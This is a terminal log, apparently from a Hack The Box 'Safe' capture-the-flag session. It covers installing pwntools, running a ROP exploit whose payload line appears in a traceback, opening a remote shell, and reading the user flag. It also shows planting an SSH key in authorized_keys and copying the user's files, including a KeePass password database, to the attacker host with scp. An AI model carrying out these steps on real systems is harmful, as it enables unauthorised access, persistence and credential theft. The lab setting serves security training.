@@ -1,0 +1,401 @@
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #cd /opt/                          
+┌─[root@parrot]─[/opt]                  
+└──╼ # git clone https://github.com/arthaud/python3-pwntools                     
+Cloning into 'python3-pwntools'...      
+remote: Enumerating objects: 23264, done.                                        
+remote: Total 23264 (delta 0), reused 0 (delta 0), pack-reused 23264             
+Receiving objects: 100% (23264/23264), 19.92 MiB | 804.00 KiB/s, done.           
+Resolving deltas: 100% (16617/16617), done.                                      
+Updating files: 100% (3595/3595), done. 
+┌─[root@parrot]─[/opt]                  
+└──╼ #cd python3-pwntools/              
+┌─[root@parrot]─[/opt/python3-pwntools] 
+└──╼ #pip3 install -e .                 
+Obtaining file:///opt/python3-pwntools  
+    Complete output from command python setup.py egg_info:                       
+    You must install the Python development headers!                             
+    $ apt-get install python3-dev       
+                                        
+    ----------------------------------------                                     
+Command "python setup.py egg_info" failed with error code 255 in /opt/python3-pwntools/      
+┌─[✗]─[root@parrot]─[/opt/python3-pwntools]                                      
+└──╼ #apt-get install python3-dev       
+Reading package lists... Done           
+Building dependency tree                
+Reading state information... Done       
+The following additional packages will be installed:                             
+  dh-python libpython3-dev libpython3.7-dev python3.7-dev                        
+The following NEW packages will be installed:                                    
+  dh-python libpython3-dev libpython3.7-dev python3-dev python3.7-dev            
+0 upgraded, 5 newly installed, 0 to remove and 1 not upgraded.                   
+Need to get 42.0 MB of archives.        
+After this operation, 77.0 MB of additional disk space will be used.             
+Do you want to continue? [Y/n] y        
+Get:3 https://mirror.aktkn.sg/parrot rolling/main amd64 libpython3-dev amd64 3.7.5-1 [20.1 kB]                                                                    
+Get:1 https://mirrors.sjtug.sjtu.edu.cn/parrot rolling/main amd64 dh-python all 4.20191017 [94.4 kB]                                                              
+Get:5 https://mirrors.sjtug.sjtu.edu.cn/parrot rolling/main amd64 python3-dev amd64 3.7.5-1 [1,268 B]                                                             
+Get:2 https://mirrors.ustc.edu.cn/parrot rolling/main amd64 libpython3.7-dev amd64 3.7.5-2 [41.4 MB]                                                              
+Get:2 https://mirrors.ustc.edu.cn/parrot rolling/main amd64 libpython3.7-dev amd64 3.7.5-2 [41.4 MB]                                                              
+Err:4 https://mirrors.ustc.edu.cn/parrot rolling/main amd64 python3.7-dev amd64 3.7.5-2                                                                           
+  Could not wait for server fd - select (11: Resource temporarily unavailable) [IP: 218.104.71.170 443]                                                           
+Fetched 27.8 MB in 2min 54s (160 kB/s)                                           
+E: Failed to fetch https://mirrors.ustc.edu.cn/parrot/pool/main/p/python3.7/python3.7-dev_3.7.5-2_amd64.deb  Could not wait for server fd - select (11: Resource temporarily unavailable) [IP: 218.104.71.170 443]                                 
+E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?        
+┌─[✗]─[root@parrot]─[/opt/python3-pwntools]                                      
+└──╼ #apt-get install python3-dev       
+Reading package lists... Done           
+Building dependency tree                
+Reading state information... Done       
+The following additional packages will be installed:                             
+  dh-python libpython3-dev libpython3.7-dev python3.7-dev                        
+The following NEW packages will be installed:                                    
+  dh-python libpython3-dev libpython3.7-dev python3-dev python3.7-dev            
+0 upgraded, 5 newly installed, 0 to remove and 1 not upgraded.                   
+Need to get 513 kB/42.0 MB of archives. 
+After this operation, 77.0 MB of additional disk space will be used.             
+Do you want to continue? [Y/n] y        
+Get:1 https://mirrors.sjtug.sjtu.edu.cn/parrot rolling/main amd64 python3.7-dev amd64 3.7.5-2 [513 kB]                                                            
+Fetched 513 kB in 29s (17.5 kB/s)       
+Selecting previously unselected package dh-python.                               
+(Reading database ... 506132 files and directories currently installed.)         
+Preparing to unpack .../dh-python_4.20191017_all.deb ...                         
+Unpacking dh-python (4.20191017) ...    
+Selecting previously unselected package libpython3.7-dev:amd64.                  
+Preparing to unpack .../libpython3.7-dev_3.7.5-2_amd64.deb ...                   
+Unpacking libpython3.7-dev:amd64 (3.7.5-2) ...                                   
+Selecting previously unselected package libpython3-dev:amd64.                    
+Preparing to unpack .../libpython3-dev_3.7.5-1_amd64.deb ...                     
+Unpacking libpython3-dev:amd64 (3.7.5-1) ...                                     
+Selecting previously unselected package python3.7-dev.                           
+Preparing to unpack .../python3.7-dev_3.7.5-2_amd64.deb ...                      
+Unpacking python3.7-dev (3.7.5-2) ...   
+Selecting previously unselected package python3-dev.                             
+Preparing to unpack .../python3-dev_3.7.5-1_amd64.deb ...                        
+Unpacking python3-dev (3.7.5-1) ...     
+Setting up dh-python (4.20191017) ...   
+Setting up libpython3.7-dev:amd64 (3.7.5-2) ...                                  
+Setting up python3.7-dev (3.7.5-2) ...  
+Setting up libpython3-dev:amd64 (3.7.5-1) ...                                    
+Setting up python3-dev (3.7.5-1) ...    
+Processing triggers for man-db (2.9.0-1) ...                                     
+Scanning application launchers          
+Updating active launchers               
+Done                                    
+┌─[root@parrot]─[/opt/python3-pwntools] 
+└──╼ #pip3 install -e .                                                                                                                                           
+Obtaining file:///opt/python3-pwntools  
+Requirement already satisfied: capstone in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (3.0.5)                                                          
+Requirement already satisfied: mako>=1.0.0 in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (1.0.7)                                                       
+Requirement already satisfied: paramiko>=1.15.2 in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (2.6.0)                                                  
+Requirement already satisfied: pip>=6.0.8 in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (18.1)                                                         
+Requirement already satisfied: psutil>=2.1.3 in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (5.6.7)                                                     
+Collecting pyelftools>=0.2.3 (from pwntools==2.2.1)                              
+  Downloading https://files.pythonhosted.org/packages/bb/2f/bf41f3c3867d6707fa9b872658bb23088a64d0e522e8979f54c694b8cbe1/pyelftools-0.26-py2.py3-none-any.whl (136kB)
+    100% |████████████████████████████████| 143kB 148kB/s                        
+Requirement already satisfied: pygments>=2.0 in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (2.3.1)                                                     
+Requirement already satisfied: pyserial>=2.7 in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (3.4)                                                       
+Requirement already satisfied: pysocks in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (1.6.8)                                                           
+Requirement already satisfied: requests>=2.0 in /usr/lib/python3/dist-packages (from pwntools==2.2.1) (2.22.0)                                                    
+Collecting ropgadget>=5.3 (from pwntools==2.2.1)                                 
+  Downloading https://files.pythonhosted.org/packages/a1/1f/f87be6f7ee9b369ea8c116112e02ff07ac80ce4553f1ac52ce1c650d9c69/ROPGadget-5.9.tar.gz                     
+Collecting tox>=1.8.1 (from pwntools==2.2.1)                                     
+  Downloading https://files.pythonhosted.org/packages/77/a7/a5b721d9bf955edfe36013e5ecc9136fc6b2fef622ab1797ff0560273d8e/tox-3.14.3-py2.py3-none-any.whl (80kB)   
+    100% |████████████████████████████████| 81kB 213kB/s                         
+Requirement already satisfied: six<2,>=1.0.0 in /usr/lib/python3/dist-packages (from tox>=1.8.1->pwntools==2.2.1) (1.13.0)                                        
+Collecting filelock<4,>=3.0.0 (from tox>=1.8.1->pwntools==2.2.1)                 
+  Downloading https://files.pythonhosted.org/packages/93/83/71a2ee6158bb9f39a90c0dea1637f81d5eef866e188e1971a1b1ab01a35a/filelock-3.0.12-py3-none-any.whl         
+Requirement already satisfied: packaging>=14 in /usr/lib/python3/dist-packages (from tox>=1.8.1->pwntools==2.2.1) (19.1)                                          
+Collecting pluggy<1,>=0.12.0 (from tox>=1.8.1->pwntools==2.2.1)                  
+  Downloading https://files.pythonhosted.org/packages/a0/28/85c7aa31b80d150b772fbe4a229487bc6644da9ccb7e427dd8cc60cb8a62/pluggy-0.13.1-py2.py3-none-any.whl       
+Collecting py<2,>=1.4.17 (from tox>=1.8.1->pwntools==2.2.1)                      
+  Downloading https://files.pythonhosted.org/packages/99/8d/21e1767c009211a62a8e3067280bfce76e89c9f876180308515942304d2d/py-1.8.1-py2.py3-none-any.whl (83kB)     
+    100% |████████████████████████████████| 92kB 151kB/s                         
+Collecting importlib-metadata<2,>=0.12; python_version < "3.8" (from tox>=1.8.1->pwntools==2.2.1)                                                                 
+  Downloading https://files.pythonhosted.org/packages/e9/71/1a1e0ed0981bb6a67bce55a210f168126b7ebd2065958673797ea66489ca/importlib_metadata-1.3.0-py2.py3-none-any.whl
+Collecting toml>=0.9.4 (from tox>=1.8.1->pwntools==2.2.1)                        
+  Downloading https://files.pythonhosted.org/packages/a2/12/ced7105d2de62fa7c8fb5fce92cc4ce66b57c95fb875e9318dba7f8c5db0/toml-0.10.0-py2.py3-none-any.whl         
+Collecting virtualenv>=16.0.0 (from tox>=1.8.1->pwntools==2.2.1)                 
+  Downloading https://files.pythonhosted.org/packages/05/f1/2e07e8ca50e047b9cc9ad56cf4291f4e041fa73207d000a095fe478abf84/virtualenv-16.7.9-py2.py3-none-any.whl (3.4MB)
+    100% |████████████████████████████████| 3.4MB 72kB/s                         
+Collecting zipp>=0.5 (from importlib-metadata<2,>=0.12; python_version < "3.8"->tox>=1.8.1->pwntools==2.2.1)                                                      
+  Downloading https://files.pythonhosted.org/packages/74/3d/1ee25a26411ba0401b43c6376d2316a71addcc72ef8690b101b4ea56d76a/zipp-0.6.0-py2.py3-none-any.whl          
+Collecting more-itertools (from zipp>=0.5->importlib-metadata<2,>=0.12; python_version < "3.8"->tox>=1.8.1->pwntools==2.2.1)                                      
+  Downloading https://files.pythonhosted.org/packages/68/03/0604cec1ea13c9f063dd50f900d1a36160334dd3cfb01fd0e638f61b46ba/more_itertools-8.0.2-py3-none-any.whl (40kB)
+    100% |████████████████████████████████| 40kB 257kB/s                         
+Building wheels for collected packages: ropgadget                                
+  Running setup.py bdist_wheel for ropgadget ... done                            
+  Stored in directory: /root/.cache/pip/wheels/f7/c1/22/f70b76b55703f63a254597c202e49fb7517cd72db8dc1ee63c                                                        
+Successfully built ropgadget            
+Installing collected packages: pyelftools, ropgadget, filelock, more-itertools, zipp, importlib-metadata, pluggy, py, toml, virtualenv, tox, pwntools             
+  Running setup.py develop for pwntools 
+Successfully installed filelock-3.0.12 importlib-metadata-1.3.0 more-itertools-8.0.2 pluggy-0.13.1 pwntools py-1.8.1 pyelftools-0.26 ropgadget-5.9 toml-0.10.0 tox-3.14.3 virtualenv-16.7.9 zipp-0.6.0    
+┌─[root@parrot]─[/opt/python3-pwntools] 
+└──╼ # pip install --upgrade pwntools   
+DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won't be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
+Collecting pwntools                     
+  Downloading https://files.pythonhosted.org/packages/a0/15/52a0254dcac681ab660b9ef346d65ea82ddb115d0026c7543f8a7e7be8e7/pwntools-3.13.0-py2-none-any.whl (9.6MB) 
+     |████████████████████████████████| 9.6MB 199kB/s                            
+Requirement already satisfied, skipping upgrade: mako>=1.0.0 in /usr/lib/python2.7/dist-packages (from pwntools) (1.0.7)                                          
+Collecting psutil>=3.3.0                
+  Downloading https://files.pythonhosted.org/packages/73/93/4f8213fbe66fc20cb904f35e6e04e20b47b85bee39845cc66a0bcf5ccdcb/psutil-5.6.7.tar.gz (448kB)              
+     |████████████████████████████████| 450kB 153kB/s                            
+Requirement already satisfied, skipping upgrade: requests>=2.0 in /usr/local/lib/python2.7/dist-packages (from pwntools) (2.18.4)                                 
+Collecting sortedcontainers<2.0         
+  Downloading https://files.pythonhosted.org/packages/1f/ba/215c652f38197729189a3c15971b4914c4650b2dbc556ea516c8b5509e8b/sortedcontainers-1.5.10-py2.py3-none-any.whl
+Requirement already satisfied, skipping upgrade: python-dateutil in /usr/lib/python2.7/dist-packages (from pwntools) (2.7.3)                                      
+Requirement already satisfied, skipping upgrade: pip>=6.0.8 in /usr/local/lib/python2.7/dist-packages (from pwntools) (19.3.1)                                    
+Requirement already satisfied, skipping upgrade: packaging in /usr/lib/python2.7/dist-packages (from pwntools) (19.1)                                             
+Requirement already satisfied, skipping upgrade: pygments>=2.0 in /usr/lib/python2.7/dist-packages (from pwntools) (2.3.1)                                        
+Requirement already satisfied, skipping upgrade: capstone>=3.0.5rc2 in /usr/lib/python2.7/dist-packages (from pwntools) (3.0.5)                                   
+Requirement already satisfied, skipping upgrade: pysocks in /usr/lib/python2.7/dist-packages (from pwntools) (1.6.8)                                              
+Collecting ropgadget>=5.3               
+  Downloading https://files.pythonhosted.org/packages/fc/30/26051e6523a20f01e15bed3e95c5fbb27d76a33f69391c3cf8a10cc8bae6/ROPGadget-5.9-py2-none-any.whl           
+Collecting intervaltree<3.0             
+  Downloading https://files.pythonhosted.org/packages/ca/c1/450d109b70fa58ca9d77972b02f69222412f9175ccf99fdeaf167be9583c/intervaltree-2.1.0.tar.gz                
+Requirement already satisfied, skipping upgrade: pyserial>=2.7 in /usr/lib/python2.7/dist-packages (from pwntools) (3.4)                                          
+Collecting pyelftools>=0.2.4            
+  Using cached https://files.pythonhosted.org/packages/bb/2f/bf41f3c3867d6707fa9b872658bb23088a64d0e522e8979f54c694b8cbe1/pyelftools-0.26-py2.py3-none-any.whl    
+Requirement already satisfied, skipping upgrade: paramiko>=1.15.2 in /usr/lib/python2.7/dist-packages (from pwntools) (2.6.0)                                     
+Collecting unicorn                      
+  Downloading https://files.pythonhosted.org/packages/7f/44/e6dd134bd7cc2dccc83e57ce435881b452a04ad5412836ba8a8e6db98dc0/unicorn-1.0.1-py2.py3-none-manylinux1_x86_64.whl (18.2MB)
+     |████████████████████████████████| 18.2MB 1.4MB/s                           
+Collecting tox>=1.8.1                   
+  Using cached https://files.pythonhosted.org/packages/77/a7/a5b721d9bf955edfe36013e5ecc9136fc6b2fef622ab1797ff0560273d8e/tox-3.14.3-py2.py3-none-any.whl         
+Requirement already satisfied, skipping upgrade: chardet<3.1.0,>=3.0.2 in /usr/lib/python2.7/dist-packages (from requests>=2.0->pwntools) (3.0.4)                 
+Requirement already satisfied, skipping upgrade: certifi>=2017.4.17 in /usr/lib/python2.7/dist-packages (from requests>=2.0->pwntools) (2018.8.24)                
+Requirement already satisfied, skipping upgrade: urllib3<1.23,>=1.21.1 in /usr/local/lib/python2.7/dist-packages (from requests>=2.0->pwntools) (1.22)            
+Requirement already satisfied, skipping upgrade: idna<2.7,>=2.5 in /usr/lib/python2.7/dist-packages (from requests>=2.0->pwntools) (2.6)                          
+Collecting virtualenv>=16.0.0           
+  Using cached https://files.pythonhosted.org/packages/05/f1/2e07e8ca50e047b9cc9ad56cf4291f4e041fa73207d000a095fe478abf84/virtualenv-16.7.9-py2.py3-none-any.whl  
+Collecting toml>=0.9.4                  
+  Using cached https://files.pythonhosted.org/packages/a2/12/ced7105d2de62fa7c8fb5fce92cc4ce66b57c95fb875e9318dba7f8c5db0/toml-0.10.0-py2.py3-none-any.whl        
+Requirement already satisfied, skipping upgrade: importlib-metadata<2,>=0.12; python_version < "3.8" in /usr/lib/python2.7/dist-packages (from tox>=1.8.1->pwntools) (0.23)
+Requirement already satisfied, skipping upgrade: py<2,>=1.4.17 in /usr/lib/python2.7/dist-packages (from tox>=1.8.1->pwntools) (1.8.0)                            
+Requirement already satisfied, skipping upgrade: pluggy<1,>=0.12.0 in /usr/lib/python2.7/dist-packages (from tox>=1.8.1->pwntools) (0.13.0)                       
+Requirement already satisfied, skipping upgrade: six<2,>=1.0.0 in /usr/lib/python2.7/dist-packages (from tox>=1.8.1->pwntools) (1.13.0)                           
+Collecting filelock<4,>=3.0.0           
+  Downloading https://files.pythonhosted.org/packages/14/ec/6ee2168387ce0154632f856d5cc5592328e9cf93127c5c9aeca92c8c16cb/filelock-3.0.12.tar.gz                   
+Requirement already satisfied, skipping upgrade: pathlib2 in /usr/lib/python2.7/dist-packages (from importlib-metadata<2,>=0.12; python_version < "3.8"->tox>=1.8.1->pwntools) (2.3.5)
+Requirement already satisfied, skipping upgrade: configparser in /usr/lib/python2.7/dist-packages (from importlib-metadata<2,>=0.12; python_version < "3.8"->tox>=1.8.1->pwntools) (3.5.0b2)              
+Requirement already satisfied, skipping upgrade: contextlib2 in /usr/lib/python2.7/dist-packages (from importlib-metadata<2,>=0.12; python_version < "3.8"->tox>=1.8.1->pwntools) (0.5.5)
+Requirement already satisfied, skipping upgrade: scandir in /usr/lib/python2.7/dist-packages (from pathlib2->importlib-metadata<2,>=0.12; python_version < "3.8"->tox>=1.8.1->pwntools) (1.10.0)          
+Building wheels for collected packages: psutil, intervaltree, filelock           
+  Building wheel for psutil (setup.py) ... done                                  
+  Created wheel for psutil: filename=psutil-5.6.7-cp27-cp27mu-linux_x86_64.whl size=262582 sha256=4d496b1718f0e9b7ffe3d21b94bdf376034b3105e4e2609ef18c6e97149032f6
+  Stored in directory: /root/.cache/pip/wheels/52/41/b0/bf50409fe2b1d3b79afa3eed71b54b3e30fe5b695db2c7ba2e                                                        
+  Building wheel for intervaltree (setup.py) ... done                            
+  Created wheel for intervaltree: filename=intervaltree-2.1.0-cp27-none-any.whl size=27609 sha256=960a3228d31b9ccc37b0604578fac23e5f3bc48375095edd310efd438bc462ad
+  Stored in directory: /root/.cache/pip/wheels/6b/cf/b0/f7ef2d0f504d26f3e9e70c2369e5725591ccfaf67d528fcbc5                                                        
+  Building wheel for filelock (setup.py) ... done                                
+  Created wheel for filelock: filename=filelock-3.0.12-cp27-none-any.whl size=7576 sha256=60508c29e4e3254477e7c342af683e6a5942a35fcea1fd4420af505f002ac684        
+  Stored in directory: /root/.cache/pip/wheels/66/13/60/ef107438d90e4aad6320e3424e50cfce5e16d1e9aad6d38294                                                        
+Successfully built psutil intervaltree filelock                                  
+Installing collected packages: psutil, sortedcontainers, ropgadget, intervaltree, pyelftools, unicorn, virtualenv, toml, filelock, tox, pwntools                  
+Successfully installed filelock-3.0.12 intervaltree-2.1.0 psutil-5.6.7 pwntools-3.13.0 pyelftools-0.26 ropgadget-5.9 sortedcontainers-1.5.10 toml-0.10.0 tox-3.14.3 unicorn-1.0.1 virtualenv-16.7.9       
+┌─[root@parrot]─[/opt/python3-pwntools] 
+└──╼ #apt-get install gdbserver         
+Reading package lists... Done           
+Building dependency tree                
+Reading state information... Done       
+The following NEW packages will be installed:                                    
+  gdbserver                             
+0 upgraded, 1 newly installed, 0 to remove and 1 not upgraded.                   
+Need to get 388 kB of archives.         
+After this operation, 814 kB of additional disk space will be used.              
+Get:1 https://mirrors.ustc.edu.cn/parrot rolling/main amd64 gdbserver amd64 8.3.1-1 [388 kB] 
+Fetched 388 kB in 45s (8,691 B/s)                                                                                                                                 
+Selecting previously unselected package gdbserver.                               
+(Reading database ... 506339 files and directories currently installed.)         
+Preparing to unpack .../gdbserver_8.3.1-1_amd64.deb ...                          
+Unpacking gdbserver (8.3.1-1) ...       
+Setting up gdbserver (8.3.1-1) ...      
+Scanning application launchers          
+Updating active launchers               
+Done                                    
+┌─[root@parrot]─[/opt/python3-pwntools] 
+└──╼ #cd -             
+/opt                   
+┌─[root@parrot]─[/opt] 
+└──╼ #cd -             
+/opt/python3-pwntools  
+┌─[root@parrot]─[/opt/python3-pwntools]       
+└──╼ #cd ~/hackthebox/safe/                   
+┌─[root@parrot]─[~/hackthebox/safe]           
+└──╼ #vi exploit.py    
+┌─[root@parrot]─[~/hackthebox/safe]           
+└──╼ #                 
+┌─[root@parrot]─[~/hackthebox/safe]           
+└──╼ #python3 exploit.py                      
+[+] Opening connection to 10.10.10.147 on port 1337: Done                                    
+[+] Starting program '/usr/bin/gdbserver': Done                                              
+[ERROR] Neither 'qemu-i386' nor 'qemu-i386-static' are available                             
+[*] running in new terminal: gdb "./myapp" -x "/tmp/pwndnbhk538.gdb" ; rm "/tmp/pwndnbhk538.gdb"                                                                  
+Traceback (most recent call last):            
+  File "exploit.py", line 20, in <module>     
+    p.recvuntil('What do you want me to echo back?')                                         
+  File "/opt/python3-pwntools/pwnlib/tubes/tube.py", line 301, in recvuntil                  
+    res = self.recv(timeout=self.timeout)     
+  File "/opt/python3-pwntools/pwnlib/tubes/tube.py", line 75, in recv                        
+    return self._recv(numb, timeout) or b''   
+  File "/opt/python3-pwntools/pwnlib/tubes/tube.py", line 149, in _recv                      
+    if not self.buffer and not self._fillbuffer(timeout):                                    
+  File "/opt/python3-pwntools/pwnlib/tubes/tube.py", line 123, in _fillbuffer                
+    data = self.recv_raw(4096)                
+  File "/opt/python3-pwntools/pwnlib/tubes/process.py", line 551, in recv_raw                
+    raise EOFError     
+EOFError               
+[*] Program './myapp' stopped with exit code 0                                               
+[*] Closed connection to 10.10.10.147 port 1337                                              
+┌─[✗]─[root@parrot]─[~/hackthebox/safe]       
+└──╼ #vi exploit.py                                                                          
+┌─[root@parrot]─[~/hackthebox/safe]           
+└──╼ #                 
+┌─[root@parrot]─[~/hackthebox/safe]           
+└──╼ #python3 exploit.py                                                                     
+[+] Opening connection to 10.10.10.147 on port 1337: Done                                    
+Traceback (most recent call last):            
+  File "exploit.py", line 22, in <module>     
+    p.sendline(junk_call + bin_sh + pop_r13 + system + null +null + test)                    
+NameError: name 'junk_call' is not defined    
+[*] Closed connection to 10.10.10.147 port 1337                                              
+┌─[✗]─[root@parrot]─[~/hackthebox/safe]       
+└──╼ #vi exploit.py                                                                          
+┌─[root@parrot]─[~/hackthebox/safe]           
+└──╼ #python3 exploit.py                                                                     
+[+] Opening connection to 10.10.10.147 on port 1337: Done                                    
+[*] Switching to interactive mode             
+ 06:17:21 up  4:28,  0 users,  load average: 0.06, 0.02, 0.00                                
+$ ls                   
+bin                    
+boot                   
+dev                    
+etc                    
+home                   
+initrd.img             
+initrd.img.old         
+lib                    
+lib64                  
+lost+found             
+media                  
+mnt                    
+opt                    
+proc                   
+root                   
+run                    
+sbin                   
+srv                    
+sys                    
+tmp                    
+usr                    
+var                    
+vmlinuz                
+vmlinuz.old            
+$ hostname             
+safe                   
+$ whoami               
+user                   
+$ ls -la               
+total 84               
+drwxr-xr-x  22 root root  4096 May 13  2019 . 
+drwxr-xr-x  22 root root  4096 May 13  2019 ..                                               
+drwxr-xr-x   2 root root  4096 May 13  2019 bin                                              
+drwxr-xr-x   3 root root  4096 May 13  2019 boot                                             
+drwxr-xr-x  17 root root  3080 Dec 29 01:48 dev                                              
+drwxr-xr-x  76 root root  4096 Aug 23 06:17 etc                                              
+drwxr-xr-x   3 root root  4096 May 13  2019 home                                             
+lrwxrwxrwx   1 root root    29 May 13  2019 initrd.img -> boot/initrd.img-4.9.0-9-amd64      
+lrwxrwxrwx   1 root root    29 May 13  2019 initrd.img.old -> boot/initrd.img-4.9.0-9-amd64  
+drwxr-xr-x  14 root root  4096 May 13  2019 lib                                              
+drwxr-xr-x   2 root root  4096 May 13  2019 lib64                                            
+drwx------   2 root root 16384 May 13  2019 lost+found                                       
+drwxr-xr-x   3 root root  4096 May 13  2019 media                                            
+drwxr-xr-x   2 root root  4096 May 13  2019 mnt                                              
+drwxr-xr-x   2 root root  4096 May 13  2019 opt                                              
+dr-xr-xr-x 135 root root     0 Dec 29 01:48 proc                                             
+drwx------   3 root root  4096 Aug 23 06:17 root                                             
+drwxr-xr-x  17 root root   540 Dec 29 01:48 run                                              
+drwxr-xr-x   2 root root  4096 Aug 23 06:17 sbin                                             
+drwxr-xr-x   2 root root  4096 May 13  2019 srv                                              
+dr-xr-xr-x  13 root root     0 Dec 29 01:48 sys                                              
+drwxrwxrwt  11 root root  4096 Dec 29 06:17 tmp                                              
+drwxr-xr-x  10 root root  4096 May 13  2019 usr                                              
+drwxr-xr-x  12 root root  4096 May 13  2019 var                                              
+lrwxrwxrwx   1 root root    26 May 13  2019 vmlinuz -> boot/vmlinuz-4.9.0-9-amd64            
+lrwxrwxrwx   1 root root    26 May 13  2019 vmlinuz.old -> boot/vmlinuz-4.9.0-9-amd64        
+$ cd usr               
+$ ls -la               
+total 56               
+drwxr-xr-x 10 root root   4096 May 13  2019 . 
+drwxr-xr-x 22 root root   4096 May 13  2019 ..                                               
+drwxr-xr-x  2 root root  20480 Aug 23 06:17 bin                                              
+drwxr-xr-x  2 root root   4096 Mar 28  2019 games                                            
+drwxr-xr-x  3 root root   4096 May 13  2019 include                                          
+drwxr-xr-x 42 root root   4096 Aug 23 06:17 lib                                              
+drwxrwsr-x 10 root staff  4096 May 13  2019 local                                            
+drwxr-xr-x  2 root root   4096 Aug 23 06:17 sbin                                             
+drwxr-xr-x 77 root root   4096 May 13  2019 share                                            
+drwxr-xr-x  2 root root   4096 Mar 28  2019 src                                              
+$ cd /home/            
+$ ls                   
+user                   
+$ cd user              
+$ ls                   
+IMG_0545.JPG           
+IMG_0546.JPG           
+IMG_0547.JPG           
+IMG_0548.JPG           
+IMG_0552.JPG           
+IMG_0553.JPG           
+myapp                  
+MyPasswords.kdbx       
+user.txt               
+$ cat user.txt         
+7a29ee9b0fa17ac013d4bf01fd127690              
+$ ls -la               
+total 11284            
+drwxr-xr-x 3 user user    4096 May 13  2019 . 
+drwxr-xr-x 3 root root    4096 May 13  2019 ..                                               
+lrwxrwxrwx 1 user user       9 May 13  2019 .bash_history -> /dev/null                       
+-rw-r--r-- 1 user user     220 May 13  2019 .bash_logout                                     
+-rw-r--r-- 1 user user    3526 May 13  2019 .bashrc                                          
+-rw-r--r-- 1 user user 1907614 May 13  2019 IMG_0545.JPG                                     
+-rw-r--r-- 1 user user 1916770 May 13  2019 IMG_0546.JPG                                     
+-rw-r--r-- 1 user user 2529361 May 13  2019 IMG_0547.JPG                                     
+-rw-r--r-- 1 user user 2926644 May 13  2019 IMG_0548.JPG                                     
+-rw-r--r-- 1 user user 1125421 May 13  2019 IMG_0552.JPG                                     
+-rw-r--r-- 1 user user 1085878 May 13  2019 IMG_0553.JPG                                     
+-rwxr-xr-x 1 user user   16592 May 13  2019 myapp                                            
+-rw-r--r-- 1 user user    2446 May 13  2019 MyPasswords.kdbx                                 
+-rw-r--r-- 1 user user     675 May 13  2019 .profile                                         
+drwx------ 2 user user    4096 May 13  2019 .ssh                                             
+-rw------- 1 user user      33 May 13  2019 user.txt                                         
+$ cd .ssh              
+$ ls                   
+$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQpj0jak3YVude2KmrAPScBfV2rC5hcnZNjiAcXZ+4PGOToVHsu9IfAwcIL58KKDgC3DN8b+rOx8nH7CJVBt+ALKYfz4Gjc7VoFeKrvFeKQCCQ9IFGU0unKc57u3jl70eIqxEZDKu6VE4ySWuWCYo/9xfM4bs2CdUUR5Pdb4UAl70QJTPEmJH4xVaIWZEDY857Pe5u1OVwDaYCaB6qkab1m55J9tv+xrc34KxnVpfuw8hEHglscpC/yfDetYCY0SYBHtAvxMyU38g87V+Y0RmEKcp9ZxUkSw6SbPVPRharpqftIqg3ZzGYes8qKInpnVoB1tBktXq/IdRRaasXEF0XCXxQ2R9ocvoIJQlnh+iRk3PGeeLwsBI/OZm8Ga/kIdR95UGnhcCySzxVhXxz7ZeSgBuDMEuH8bfssmtV6FVgXzkqDb2dSNNT8vv22i8ApNBfXKzak0nTtb2qkpPtrHid3XsI95OWsf+sr9g+/CaM6XZsx3qI0Fbpay7PmyMyzlM=' > authorized_keys                                                                     
+$ ls                   
+authorized_keys        
+$ exit                 
+$ exit                 
+[*] Got EOF while reading in interactive      
+$ q                    
+$                      
+[*] Interrupted        
+[*] Closed connection to 10.10.10.147 port 1337                                              
+┌─[root@parrot]─[~/hackthebox/safe]           
+└──╼ #mkdir file                        
+┌─[root@parrot]─[~/hackthebox/safe]     
+└──╼ #cd file                           
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #scp -i ../safe user@10.10.10.147:* .                                       
+IMG_0545.JPG                                                                                                                    100% 1863KB 250.7KB/s   00:07     
+IMG_0546.JPG                                                                                                                    100% 1872KB 322.7KB/s   00:05     
+IMG_0547.JPG                                                                                                                    100% 2470KB 504.2KB/s   00:04     
+IMG_0548.JPG                                                                                                                    100% 2858KB 597.7KB/s   00:04     
+IMG_0552.JPG                                                                                                                    100% 1099KB 653.5KB/s   00:01     
+IMG_0553.JPG                                                                                                                    100% 1060KB 872.6KB/s   00:01     
+myapp                                                                                                                           100%   16KB  65.5KB/s   00:00     
+MyPasswords.kdbx                                                                                                                100% 2446     7.5KB/s   00:00     
+user.txt                                                                                                                        100%   33     0.1KB/s   00:00     
+┌─[root@parrot]─[~/hackthebox/safe/file]
+└──╼ #                                  
